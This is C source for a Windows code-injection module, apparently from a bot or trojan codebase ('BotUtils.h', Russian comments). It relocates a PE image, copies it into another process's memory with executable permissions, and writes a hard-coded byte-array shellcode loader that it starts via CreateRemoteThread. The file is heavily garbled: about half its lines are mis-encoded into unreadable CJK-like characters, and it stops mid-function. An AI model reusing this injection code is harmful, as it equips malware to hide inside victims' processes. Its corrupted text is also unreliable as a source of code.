#include <windows.h>਀⌀椀渀挀氀甀搀攀 㰀琀氀栀攀氀瀀㌀㈀⸀栀㸀 
਀⌀椀渀挀氀甀搀攀 ∀䜀攀琀䄀瀀椀⸀栀∀ 
#include "DllLoader.h"਀⌀椀渀挀氀甀搀攀 ∀䴀攀洀漀爀礀⸀栀∀ 
#include "Strings.h"਀⌀椀渀挀氀甀搀攀 ∀唀琀椀氀猀⸀栀∀ 
#include "BotUtils.h"਀⌀椀渀挀氀甀搀攀 ∀渀琀搀氀氀⸀栀∀ 
਀⌀搀攀昀椀渀攀 䴀愀欀攀倀琀爀⠀ 挀愀猀琀Ⰰ 瀀琀爀Ⰰ 愀搀搀嘀愀氀甀攀 ⤀ ⠀挀愀猀琀⤀⠀ ⠀䐀圀伀刀䐀开倀吀刀⤀⠀瀀琀爀⤀ ⬀ ⠀䐀圀伀刀䐀开倀吀刀⤀⠀愀搀搀嘀愀氀甀攀⤀⤀  
#define MakeDelta(cast, x, y) (cast) ( (DWORD_PTR)(x) - (DWORD_PTR)(y)) ਀ 
DWORD dwNewBase = 0;਀ 
DWORD GetImageBase2()਀笀 
	DWORD dwRet = 0;਀  ⼀⨀ऀ开开愀猀洀 
	{਀ऀऀऀ挀愀氀氀 最攀琀戀愀猀攀 
		getbase:਀ऀऀऀ瀀漀瀀 攀愀砀 
			and eax, 0ffff0000h਀ऀऀ昀椀渀搀㨀 
			cmp word ptr [ eax ], 0x5a4d਀ऀऀऀ樀攀 攀渀搀 
			sub eax, 00010000h਀ऀऀऀ樀洀瀀 昀椀渀搀 
		end:਀ऀऀऀ洀漀瘀 嬀搀眀刀攀琀崀Ⰰ 攀愀砀 
	} */਀ 
	return dwRet;਀紀 
਀䐀圀伀刀䐀 䜀攀琀䤀洀愀最攀䈀愀猀攀⠀⤀ 
{਀⼀⨀ 
(28.12.2010 06:00:39) samuel_ro: Попробуй в асм блоке код: ਀⠀㈀㠀⸀㄀㈀⸀㈀　㄀　 　㘀㨀　　㨀㐀㠀⤀ 猀愀洀甀攀氀开爀漀㨀 搀戀 　砀攀㠀 
(28.12.2010 06:00:56) samuel_ro: dd 0x00000000਀⠀㈀㠀⸀㄀㈀⸀㈀　㄀　 　㘀㨀　㄀㨀㄀㈀⤀ 猀愀洀甀攀氀开爀漀㨀 瀀漀瀀 攀愀砀 ⼀⼀攀愀砀 㰀ⴀ 攀椀瀀 
(28.12.2010 06:02:57) samuel_ro: код 0xe800000000 эквивалентен call +0, т.е. вызов команды следующей за call਀⨀⼀ 
	਀ऀ䐀圀伀刀䐀 搀眀刀攀琀 㴀 　㬀 
	਀ऀ䐀圀伀刀䐀⨀ 䄀搀搀爀 㴀 ⠀䐀圀伀刀䐀 ⨀⤀☀䜀攀琀䤀洀愀最攀䈀愀猀攀㬀 
਀ऀ开开愀猀洀 
	{਀ऀऀऀ洀漀瘀 䔀䄀堀Ⰰ 䄀搀搀爀 
			and eax, 0FFFF0000h਀ऀऀ昀椀渀搀㨀 
			cmp word ptr [ eax ], 0x5A4D਀ऀऀऀ樀攀 攀渀搀 
			sub eax, 00010000h਀ऀऀऀ䨀䴀倀 昀椀渀搀 
		end:਀ऀऀऀ洀漀瘀 嬀搀眀刀攀琀崀Ⰰ 攀愀砀 
	}਀ 
	return dwRet;਀紀 
਀ 
਀瘀漀椀搀 倀攀爀昀漀爀洀刀攀戀愀猀攀⠀ 䰀倀嘀伀䤀䐀 氀瀀䄀搀搀爀攀猀猀Ⰰ 䐀圀伀刀䐀 搀眀一攀眀䈀愀猀攀 ⤀ 
{਀ऀ倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀 瀀䐀䠀 㴀 ⠀倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀⤀氀瀀䄀搀搀爀攀猀猀㬀 
਀ऀ椀昀 ⠀ 瀀䐀䠀ⴀ㸀攀开洀愀最椀挀 ℀㴀 䤀䴀䄀䜀䔀开䐀伀匀开匀䤀䜀一䄀吀唀刀䔀 ⤀ 
	{਀ऀऀ爀攀琀甀爀渀㬀 
	}਀ 
	PIMAGE_NT_HEADERS pPE = (PIMAGE_NT_HEADERS) ((char *)pDH + pDH->e_lfanew);਀ 
	if ( pPE->Signature != IMAGE_NT_SIGNATURE )਀ऀ笀 
		return;਀ऀ紀 
਀ऀ䐀圀伀刀䐀 搀眀䐀攀氀琀愀 㴀 搀眀一攀眀䈀愀猀攀 ⴀ 瀀倀䔀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䤀洀愀最攀䈀愀猀攀㬀 
਀ऀ䐀圀伀刀䐀 搀眀嘀愀 㴀 瀀倀䔀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䐀愀琀愀䐀椀爀攀挀琀漀爀礀嬀䤀䴀䄀䜀䔀开䐀䤀刀䔀䌀吀伀刀夀开䔀一吀刀夀开䈀䄀匀䔀刀䔀䰀伀䌀崀⸀嘀椀爀琀甀愀氀䄀搀搀爀攀猀猀㬀 
	DWORD dwCb = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;਀ 
	PIMAGE_BASE_RELOCATION pBR = MakePtr( PIMAGE_BASE_RELOCATION, lpAddress, dwVa );਀ 
	UINT c = 0;਀ 
	while ( c < dwCb )਀ऀ笀 
		c += pBR->SizeOfBlock;਀ 
		int RelocCount = (pBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);਀ 
		LPVOID lpvBase = MakePtr(LPVOID, lpAddress, pBR->VirtualAddress);਀ 
		WORD *areloc = MakePtr(LPWORD, pBR, sizeof(IMAGE_BASE_RELOCATION));਀ 
		for ( int i = 0; i < RelocCount; i++ )਀ऀऀ笀 
			int type = areloc[i] >> 12;਀ 
			if ( !type )਀ऀऀऀ笀 
				continue;਀ऀऀऀ紀 
਀ऀऀऀ椀昀 ⠀ 琀礀瀀攀 ℀㴀 ㌀ ⤀ 
			{਀ऀऀऀऀ爀攀琀甀爀渀㬀 
			}਀ 
			int ofs = areloc[i] & 0x0fff;਀ 
			DWORD *pReloc = MakePtr( DWORD *, lpvBase, ofs );਀ 
			if ( *pReloc - pPE->OptionalHeader.ImageBase > pPE->OptionalHeader.SizeOfImage )਀ऀऀऀ笀 
				return;਀ऀऀऀ紀 
਀ऀऀऀ⨀瀀刀攀氀漀挀 ⬀㴀 搀眀䐀攀氀琀愀㬀 
		}਀ 
		pBR = MakePtr( PIMAGE_BASE_RELOCATION, pBR, pBR->SizeOfBlock );਀ऀ紀 
਀ऀ瀀倀䔀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䤀洀愀最攀䈀愀猀攀 㴀 搀眀一攀眀䈀愀猀攀㬀 
਀ऀ爀攀琀甀爀渀㬀 
}਀ 
typedef struct ਀笀 
	WORD	Offset:12;਀ऀ圀伀刀䐀ऀ吀礀瀀攀㨀㐀㬀 
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;਀ 
void ProcessRelocs( PIMAGE_BASE_RELOCATION Relocs, DWORD ImageBase, DWORD Delta, DWORD RelocSize )਀笀 
	PIMAGE_BASE_RELOCATION Reloc = Relocs;਀ 
	while ( (DWORD)Reloc - (DWORD)Relocs < RelocSize ) ਀ऀ笀 
		if ( !Reloc->SizeOfBlock )਀ऀऀ笀 
			break;਀ऀऀ紀 
਀ऀऀ倀䤀䴀䄀䜀䔀开䘀䤀堀唀倀开䔀一吀刀夀 䘀椀砀甀瀀 㴀 ⠀倀䤀䴀䄀䜀䔀开䘀䤀堀唀倀开䔀一吀刀夀⤀⠀⠀唀䰀伀一䜀⤀刀攀氀漀挀 ⬀ 猀椀稀攀漀昀⠀䤀䴀䄀䜀䔀开䈀䄀匀䔀开刀䔀䰀伀䌀䄀吀䤀伀一⤀⤀㬀 
਀ऀऀ昀漀爀 ⠀ 唀䰀伀一䜀 爀 㴀 　㬀 爀 㰀 ⠀刀攀氀漀挀ⴀ㸀匀椀稀攀伀昀䈀氀漀挀欀 ⴀ 猀椀稀攀漀昀⠀䤀䴀䄀䜀䔀开䈀䄀匀䔀开刀䔀䰀伀䌀䄀吀䤀伀一⤀⤀ 㸀㸀 ㄀㬀 爀⬀⬀ ⤀  
		{਀ऀऀऀ䐀圀伀刀䐀 搀眀倀漀椀渀琀攀爀刀瘀愀 㴀 刀攀氀漀挀ⴀ㸀嘀椀爀琀甀愀氀䄀搀搀爀攀猀猀 ⬀ 䘀椀砀甀瀀ⴀ㸀伀昀昀猀攀琀㬀 
਀ऀऀऀ椀昀 ⠀ 䘀椀砀甀瀀ⴀ㸀伀昀昀猀攀琀 ℀㴀 　  ⤀ 
			{਀ऀऀऀऀ⨀⠀倀唀䰀伀一䜀⤀⠀⠀唀䰀伀一䜀⤀䤀洀愀最攀䈀愀猀攀 ⬀ 搀眀倀漀椀渀琀攀爀刀瘀愀⤀ ⬀㴀 䐀攀氀琀愀㬀 
			}਀ 
			Fixup++;਀ऀऀ紀 
਀ऀऀ刀攀氀漀挀 㴀 ⠀倀䤀䴀䄀䜀䔀开䈀䄀匀䔀开刀䔀䰀伀䌀䄀吀䤀伀一⤀⠀ ⠀唀䰀伀一䜀⤀刀攀氀漀挀 ⬀ 刀攀氀漀挀ⴀ㸀匀椀稀攀伀昀䈀氀漀挀欀 ⤀㬀 
	}਀ 
	return;਀紀 
਀ 
਀䐀圀伀刀䐀 䤀渀樀攀挀琀䌀漀搀攀⠀ 䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀Ⰰ 䰀倀吀䠀刀䔀䄀䐀开匀吀䄀刀吀开刀伀唀吀䤀一䔀 氀瀀匀琀愀爀琀倀爀漀挀 ⤀ 
{਀ऀ䠀䴀伀䐀唀䰀䔀 栀䴀漀搀甀氀攀 㴀 ⠀䠀䴀伀䐀唀䰀䔀⤀䜀攀琀䤀洀愀最攀䈀愀猀攀⠀⤀㬀 
਀ऀ倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀 瀀䐀䠀 㴀 ⠀倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀⤀栀䴀漀搀甀氀攀㬀 
	PIMAGE_NT_HEADERS pPE = (PIMAGE_NT_HEADERS) ((LPSTR)pDH + pDH->e_lfanew);਀ 
	DWORD dwSize = pPE->OptionalHeader.SizeOfImage;਀ 
	LPVOID lpNewAddr = MemAlloc( dwSize );਀ 
	if ( lpNewAddr == NULL )਀ऀ笀 
		return -1;਀ऀ紀 
਀ऀ洀开洀攀洀挀瀀礀⠀ 氀瀀一攀眀䄀搀搀爀Ⰰ 栀䴀漀搀甀氀攀Ⰰ 搀眀匀椀稀攀 ⤀㬀 
਀ऀ䰀倀嘀伀䤀䐀 氀瀀一攀眀䴀漀搀甀氀攀 㴀 一唀䰀䰀㬀 
਀ऀ䐀圀伀刀䐀 搀眀䄀搀搀爀 㴀 ⴀ㄀㬀 
	HMODULE hNewModule = NULL;਀ 
	if ( (NTSTATUS)pZwAllocateVirtualMemory( hProcess, &lpNewModule, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) == STATUS_SUCCESS )਀ऀ笀 
		hNewModule = (HMODULE)lpNewModule;	਀ 
		ULONG RelRVA   = pPE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;਀ऀऀ唀䰀伀一䜀 刀攀氀匀椀稀攀  㴀 瀀倀䔀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀䐀愀琀愀䐀椀爀攀挀琀漀爀礀嬀䤀䴀䄀䜀䔀开䐀䤀刀䔀䌀吀伀刀夀开䔀一吀刀夀开䈀䄀匀䔀刀䔀䰀伀䌀崀⸀匀椀稀攀㬀 
਀ऀऀ倀爀漀挀攀猀猀刀攀氀漀挀猀⠀ ⠀倀䤀䴀䄀䜀䔀开䈀䄀匀䔀开刀䔀䰀伀䌀䄀吀䤀伀一⤀⠀ ⠀䐀圀伀刀䐀⤀栀䴀漀搀甀氀攀 ⬀ 刀攀氀刀嘀䄀 ⤀Ⰰ ⠀䐀圀伀刀䐀⤀氀瀀一攀眀䄀搀搀爀Ⰰ ⠀䐀圀伀刀䐀⤀栀一攀眀䴀漀搀甀氀攀 ⴀ ⠀䐀圀伀刀䐀⤀栀䴀漀搀甀氀攀Ⰰ 刀攀氀匀椀稀攀 ⤀㬀ऀऀ 
਀ऀऀ搀眀一攀眀䈀愀猀攀 㴀 ⠀䐀圀伀刀䐀⤀栀一攀眀䴀漀搀甀氀攀㬀 
਀ऀऀ椀昀 ⠀ ⠀一吀匀吀䄀吀唀匀⤀瀀娀眀圀爀椀琀攀嘀椀爀琀甀愀氀䴀攀洀漀爀礀⠀ 栀倀爀漀挀攀猀猀Ⰰ   栀一攀眀䴀漀搀甀氀攀Ⰰ 氀瀀一攀眀䄀搀搀爀Ⰰ 搀眀匀椀稀攀Ⰰ 一唀䰀䰀 ⤀ 㴀㴀 匀吀䄀吀唀匀开匀唀䌀䌀䔀匀匀 ⤀ 
		{਀ऀऀऀ搀眀䄀搀搀爀 㴀 ⠀䐀圀伀刀䐀⤀氀瀀匀琀愀爀琀倀爀漀挀 ⴀ ⠀䐀圀伀刀䐀⤀栀䴀漀搀甀氀攀 ⬀ ⠀䐀圀伀刀䐀⤀栀一攀眀䴀漀搀甀氀攀㬀 
		}਀ऀ紀 
਀ऀ䐀圀伀刀䐀 搀眀伀氀搀倀爀漀琀攀挀琀 㴀 　㬀 
	pZwProtectVirtualMemory( hProcess, hNewModule, &dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect );਀ऀ 
	MemFree( lpNewAddr );਀ऀ 
	return dwAddr;਀紀 
਀ 
਀倀嘀伀䤀䐀 刀攀洀漀甀琀攀䄀氀氀漀挀愀琀攀䤀洀愀最攀䐀氀氀⠀䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀Ⰰ倀嘀伀䤀䐀 瀀䐀氀氀⤀ 
{਀ऀ倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀ऀ瀀䐀漀猀㬀 
	PIMAGE_NT_HEADERS	pNt;਀ऀ倀䤀䴀䄀䜀䔀开匀䔀䌀吀䤀伀一开䠀䔀䄀䐀䔀刀ऀ匀攀挀琀椀漀渀㬀 
	DWORD NumberOfSection;਀ऀ䐀圀伀刀䐀 匀椀稀攀伀昀䤀洀愀最攀㬀 
	PCHAR RemouteAddr = 0;਀ऀ倀䤀䴀䄀䜀䔀开䈀䄀匀䔀开刀䔀䰀伀䌀䄀吀䤀伀一ऀ瀀刀攀氀漀挀猀㬀 
	ULONG dwSize;਀ 
਀ऀ瀀䐀漀猀 㴀 ⠀倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀⤀ 瀀䐀氀氀㬀 
	pNt = (PIMAGE_NT_HEADERS) (pDos->e_lfanew + (PCHAR)pDll);਀ 
	NumberOfSection = pNt->FileHeader.NumberOfSections;਀ऀ匀椀稀攀伀昀䤀洀愀最攀ऀऀ㴀 瀀一琀ⴀ㸀伀瀀琀椀漀渀愀氀䠀攀愀搀攀爀⸀匀椀稀攀伀昀䤀洀愀最攀㬀 
	Section			= IMAGE_FIRST_SECTION(pNt);਀ऀ 
	pRelocs			= (PIMAGE_BASE_RELOCATION)pRtlImageDirectoryEntryToData(pDll,FALSE,IMAGE_DIRECTORY_ENTRY_BASERELOC,&dwSize);਀ 
//	настройка секций਀⼀⼀ 
	if ( (NTSTATUS)pZwAllocateVirtualMemory( hProcess, &RemouteAddr, 0, &SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) == STATUS_SUCCESS )਀ऀ笀 
		ULONG i  = 0;਀ 
		ULONG	delta = (ULONG)RemouteAddr - pNt->OptionalHeader.ImageBase;਀ऀऀ倀䌀䠀䄀刀ऀ搀攀猀琀㬀 
		PWORD	relInfo;਀ 
		while(i < NumberOfSection)਀ऀऀ笀 
			dwSize = Section[i].SizeOfRawData;਀ऀऀऀ瀀圀爀椀琀攀倀爀漀挀攀猀猀䴀攀洀漀爀礀⠀栀倀爀漀挀攀猀猀Ⰰ匀攀挀琀椀漀渀嬀椀崀⸀嘀椀爀琀甀愀氀䄀搀搀爀攀猀猀 ⬀ 刀攀洀漀甀琀攀䄀搀搀爀Ⰰ匀攀挀琀椀漀渀嬀椀崀⸀倀漀椀渀琀攀爀吀漀刀愀眀䐀愀琀愀 ⬀ ⠀倀䌀䠀䄀刀⤀瀀䐀氀氀Ⰰ搀眀匀椀稀攀Ⰰ☀搀眀匀椀稀攀⤀㬀 
			++i;਀ऀऀ紀㬀 
਀⼀⼀ 
//	удаленная настройка релоков਀ऀऀ眀栀椀氀攀 ⠀ 瀀刀攀氀漀挀猀ⴀ㸀嘀椀爀琀甀愀氀䄀搀搀爀攀猀猀 㸀 　⤀ 
		{਀ऀऀऀ搀攀猀琀 㴀 刀攀洀漀甀琀攀䄀搀搀爀 ⬀ 瀀刀攀氀漀挀猀ⴀ㸀嘀椀爀琀甀愀氀䄀搀搀爀攀猀猀㬀 
			relInfo = (PWORD)( sizeof(IMAGE_BASE_RELOCATION)+(PCHAR)pRelocs);਀ 
			for ( i = 0; i < ((pRelocs->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION)) / 2 ); i++, relInfo++ )਀ऀऀऀ笀 
				DWORD dw;਀ऀऀऀऀ䐀圀伀刀䐀 ⨀瀀愀琀挀栀䄀搀搀爀䠀䰀㬀 
				int type, offset;਀ 
				type = *relInfo >> 12;਀ऀऀऀऀ漀昀昀猀攀琀 㴀⨀爀攀氀䤀渀昀漀 ☀ 　砀昀昀昀㬀 
਀ऀऀऀऀ猀眀椀琀挀栀 ⠀ 琀礀瀀攀 ⤀ 
				{਀ऀऀऀऀऀ挀愀猀攀 䤀䴀䄀䜀䔀开刀䔀䰀开䈀䄀匀䔀䐀开䄀䈀匀伀䰀唀吀䔀㨀 
						break;਀ 
					case IMAGE_REL_BASED_HIGHLOW:਀ऀऀऀऀऀऀ瀀愀琀挀栀䄀搀搀爀䠀䰀 㴀 ⠀䐀圀伀刀䐀 ⨀⤀⠀搀攀猀琀 ⬀ 漀昀昀猀攀琀⤀㬀 
						if(!pReadProcessMemory(hProcess,patchAddrHL,&dw,sizeof(dw),&dwSize))਀ऀऀऀऀऀऀऀ戀爀攀愀欀㬀 
						dw+=delta;਀ऀऀऀऀऀऀ瀀圀爀椀琀攀倀爀漀挀攀猀猀䴀攀洀漀爀礀⠀栀倀爀漀挀攀猀猀Ⰰ瀀愀琀挀栀䄀搀搀爀䠀䰀Ⰰ☀搀眀Ⰰ猀椀稀攀漀昀⠀搀眀⤀Ⰰ☀搀眀匀椀稀攀⤀㬀 
						break;਀ 
					default:਀ऀऀऀऀऀऀ戀爀攀愀欀㬀 
				}਀ऀऀऀ紀 
਀ऀऀऀ瀀刀攀氀漀挀猀 㴀⠀倀䤀䴀䄀䜀䔀开䈀䄀匀䔀开刀䔀䰀伀䌀䄀吀䤀伀一⤀⠀ 瀀刀攀氀漀挀猀ⴀ㸀匀椀稀攀伀昀䈀氀漀挀欀 ⬀ ⠀倀䌀䠀䄀刀⤀瀀刀攀氀漀挀猀⤀㬀 
		};਀ 
//਀⼀⼀ऀऀ㜀〄㼄㠄䄄䰄 㜀〄㌄㸄㬄㸄㈄㨄㸄㈄
		dwSize = pDos->e_lfanew+ pNt->FileHeader.SizeOfOptionalHeader + sizeof(IMAGE_FILE_HEADER)+ sizeof(DWORD) + sizeof(IMAGE_SECTION_HEADER)*NumberOfSection;	਀ऀऀ瀀圀爀椀琀攀倀爀漀挀攀猀猀䴀攀洀漀爀礀⠀栀倀爀漀挀攀猀猀Ⰰ刀攀洀漀甀琀攀䄀搀搀爀Ⰰ瀀䐀氀氀Ⰰ搀眀匀椀稀攀Ⰰ☀搀眀匀椀稀攀⤀㬀 
਀ऀ紀㬀 
਀ 
਀ऀ 
	return RemouteAddr;਀紀㬀 
਀倀嘀伀䤀䐀 䤀渀樀攀挀琀刀攀洀漀甀琀攀䐀氀氀⠀䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀Ⰰ倀嘀伀䤀䐀 瀀䐀氀氀Ⰰ䐀圀伀刀䐀 猀椀稀攀Ⰰ倀䌀䠀䄀刀 刀甀渀刀漀甀琀椀渀攀Ⰰ倀嘀伀䤀䐀 倀愀爀愀洀⤀ 
{਀⌀椀昀搀攀昀 开堀㠀㘀开 
// loader.asm ਀ऀ猀琀爀甀挀琀 笀 
		DWORD						ImageBaseDll;਀ऀऀ䐀圀伀刀䐀ऀऀऀऀऀऀ䔀渀琀爀礀倀漀椀渀琀㬀 
		PCHAR						StartExportFunc;਀ऀऀ倀嘀伀䤀䐀ऀऀऀऀऀऀ倀愀爀愀洀㬀 
		PIMAGE_IMPORT_DESCRIPTOR	ImportDesc;	਀ऀऀ䐀圀伀刀䐀ऀऀऀऀऀऀ䤀洀瀀漀爀琀匀椀稀攀㬀 
	}LoaderConfig;਀ 
	char loader[] = {਀ऀ 
"\xeb\x00\x55\x89\xe5\x83\xec\x04\x8b\x7d\x08\x8b\x07\x89\x45"਀∀尀砀昀挀尀砀㠀戀尀砀㐀㜀尀砀　㐀尀砀㠀㔀尀砀挀　尀砀㜀㐀尀砀㄀㔀尀砀㔀　尀砀昀昀尀砀㜀㔀尀砀昀挀尀砀攀㠀尀砀㄀　尀砀　　∀ 
"\x00\x00\x85\xc0\x74\x08\x8b\x7d\x08\xff\x77\x08\xff\xd0\xc9"਀∀尀砀挀㈀尀砀　㐀尀砀　　尀砀㔀㔀尀砀㠀㤀尀砀攀㔀尀砀㔀㘀尀砀㔀㜀尀砀㔀㌀尀砀㔀㈀尀砀㔀㄀尀砀㌀㄀尀砀挀　尀砀㠀戀尀砀㔀搀∀ 
"\x08\x66\x8b\x43\x3c\x8d\x3c\x18\x8b\x7f\x78\x8d\x3c\x1f\x8b"਀∀尀砀㐀昀尀砀㄀㠀尀砀㠀戀尀砀㜀㜀尀砀㄀挀尀砀㠀戀尀砀㔀㜀尀砀㈀　尀砀㠀搀尀砀㌀㐀尀砀㄀攀尀砀㠀搀尀砀㄀㐀尀砀㄀愀尀砀㠀㔀∀ 
"\xc9\x74\x24\x8b\x04\x8a\x8d\x04\x18\x50\xff\x75\x0c\xe8\x3a"਀∀尀砀　　尀砀　　尀砀　　尀砀㜀㔀尀砀㄀㄀尀砀㠀戀尀砀㐀㜀尀砀㈀㐀尀砀　㄀尀砀搀㠀尀砀　昀尀砀戀㜀尀砀　㐀尀砀㐀㠀尀砀㠀戀∀ 
"\x04\x86\x03\x45\x08\xeb\x04\xe2\xdc\x31\xc0\x59\x5a\x5b\x5f"਀∀尀砀㔀攀尀砀挀㤀尀砀挀㈀尀砀　㠀尀砀　　尀砀㔀㔀尀砀㠀㤀尀砀攀㔀尀砀㔀㘀尀砀㠀戀尀砀㜀㔀尀砀　㠀尀砀㠀愀尀砀　㘀尀砀　㠀∀ 
"\xc0\x74\x03\x46\xeb\xf7\x89\xf0\x2b\x45\x08\x5e\xc9\xc2\x04"਀∀尀砀　　尀砀㔀㔀尀砀㠀㤀尀砀攀㔀尀砀㔀㄀尀砀㔀㘀尀砀㔀㜀尀砀昀昀尀砀㜀㔀尀砀　㠀尀砀攀㠀尀砀搀㠀尀砀昀昀尀砀昀昀尀砀昀昀∀ 
"\x89\xc1\xff\x75\x0c\xe8\xce\xff\xff\xff\x39\xc1\x75\x14\x8b"਀∀尀砀㜀㔀尀砀　㠀尀砀㠀戀尀砀㜀搀尀砀　挀尀砀㠀愀尀砀　㜀尀砀㌀㠀尀砀　㘀尀砀㜀㔀尀砀　㠀尀砀㐀㘀尀砀㐀㜀尀砀攀㈀尀砀昀㘀∀ 
"\x31\xc0\xeb\x03\x31\xc0\x48\x5f\x5e\x59\xc9\xc2\x08\x00"਀紀㬀 
਀⌀攀渀搀椀昀 
		PCHAR			RemouteAddr = (PCHAR)RemouteAllocateImageDll(hProcess,pDll);;਀ऀऀ䐀圀伀刀䐀 䰀漀愀搀攀爀䴀攀洀匀椀稀攀 㴀 猀椀稀攀漀昀⠀氀漀愀搀攀爀⤀ ⬀ 猀椀稀攀漀昀⠀䰀漀愀搀攀爀䌀漀渀昀椀最⤀ ⬀ ㄀　㈀㐀㬀  
		DWORD pLoaderStart = 0;਀ 
		if(	(NTSTATUS)pZwAllocateVirtualMemory( hProcess, &pLoaderStart, 0, &LoaderMemSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) == STATUS_SUCCESS )਀ऀऀ笀 
			DWORD id;਀ऀऀऀ䐀圀伀刀䐀 搀眀伀氀搀倀爀漀琀攀挀琀 㴀 　㬀 
			PVOID tmp_mem = MemAlloc(LoaderMemSize);਀ 
			LoaderConfig.ImageBaseDll		= (DWORD) RemouteAddr;਀ऀऀऀ䰀漀愀搀攀爀䌀漀渀昀椀最⸀匀琀愀爀琀䔀砀瀀漀爀琀䘀甀渀挀ऀ㴀  猀椀稀攀漀昀⠀氀漀愀搀攀爀⤀ ⬀ 猀椀稀攀漀昀⠀䰀漀愀搀攀爀䌀漀渀昀椀最⤀ ⬀ ⠀倀䌀䠀䄀刀⤀瀀䰀漀愀搀攀爀匀琀愀爀琀㬀 
			LoaderConfig.Param				=  Param;਀ऀऀऀ䰀漀愀搀攀爀䌀漀渀昀椀最⸀䤀洀瀀漀爀琀䐀攀猀挀ऀऀऀ㴀 ⠀倀䤀䴀䄀䜀䔀开䤀䴀倀伀刀吀开䐀䔀匀䌀刀䤀倀吀伀刀⤀⠀ ⠀⠀倀䤀䴀䄀䜀䔀开一吀开䠀䔀䄀䐀䔀刀匀⤀⠀ ⠀倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀⠀瀀䐀氀氀⤀⤀ⴀ㸀攀开氀昀愀渀攀眀 ⬀ऀऀऀ尀 
				(PCHAR)pDll))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);	਀ऀऀऀ䰀漀愀搀攀爀䌀漀渀昀椀最⸀䤀洀瀀漀爀琀匀椀稀攀ऀऀऀ㴀 ⠀䐀圀伀刀䐀⤀⠀ ⠀⠀倀䤀䴀䄀䜀䔀开一吀开䠀䔀䄀䐀䔀刀匀⤀⠀ ⠀倀䤀䴀䄀䜀䔀开䐀伀匀开䠀䔀䄀䐀䔀刀⠀瀀䐀氀氀⤀⤀ⴀ㸀攀开氀昀愀渀攀眀 ⬀ऀऀऀ尀 
				(PCHAR)pDll))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);	਀ 
			m_memcpy(0 + (PCHAR)tmp_mem,loader,sizeof(loader));਀ 
			m_memcpy(sizeof(loader) + (PCHAR)tmp_mem,&LoaderConfig,sizeof(LoaderConfig));਀ 
			m_memcpy( (sizeof(loader) + sizeof(LoaderConfig)+ (PCHAR)tmp_mem ),RunRoutine,(DWORD)plstrlenA(RunRoutine) + 1);਀ऀऀऀ 
਀ऀऀऀ瀀圀爀椀琀攀倀爀漀挀攀猀猀䴀攀洀漀爀礀⠀栀倀爀漀挀攀猀猀Ⰰ瀀䰀漀愀搀攀爀匀琀愀爀琀Ⰰ琀洀瀀开洀攀洀Ⰰ䰀漀愀搀攀爀䴀攀洀匀椀稀攀Ⰰ☀䰀漀愀搀攀爀䴀攀洀匀椀稀攀⤀㬀 
਀ऀऀऀ䴀攀洀䘀爀攀攀⠀琀洀瀀开洀攀洀⤀㬀 
਀ऀऀऀ瀀䌀氀漀猀攀䠀愀渀搀氀攀⠀ 瀀䌀爀攀愀琀攀刀攀洀漀琀攀吀栀爀攀愀搀⠀栀倀爀漀挀攀猀猀Ⰰ一唀䰀䰀Ⰰ　Ⰰ⠀䰀倀吀䠀刀䔀䄀䐀开匀吀䄀刀吀开刀伀唀吀䤀一䔀⤀瀀䰀漀愀搀攀爀匀琀愀爀琀Ⰰ 猀椀稀攀漀昀⠀氀漀愀搀攀爀⤀ ⬀ ⠀倀䌀䠀䄀刀⤀瀀䰀漀愀搀攀爀匀琀愀爀琀Ⰰ　Ⰰ☀椀搀⤀ ⤀㬀 
		};਀ 
	return RemouteAddr;਀紀㬀 
਀戀漀漀氀 䤀渀樀攀挀琀䌀漀搀攀㈀⠀ 䠀䄀一䐀䰀䔀 栀倀爀漀挀攀猀猀Ⰰ 䠀䄀一䐀䰀䔀 栀吀栀爀攀愀搀Ⰰ 䐀圀伀刀䐀 ⠀圀䤀一䄀倀䤀 昀开䴀愀椀渀⤀⠀䰀倀嘀伀䤀䐀⤀ ⤀ 
{਀ऀ䐀圀伀刀䐀 搀眀䈀愀猀攀 㴀 䜀攀琀䤀洀愀最攀䈀愀猀攀⠀⤀㬀 
	DWORD dwSize = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE *)(dwBase) + ((PIMAGE_DOS_HEADER)(dwBase))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;਀ 
	HANDLE hMap = pCreateFileMappingA( (HANDLE)-1, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL );਀ 
    LPVOID lpView = pMapViewOfFile( hMap, FILE_MAP_WRITE, 0, 0, 0 );਀ 
	if ( lpView == NULL )਀ऀ笀 
		return false;਀ऀ紀 
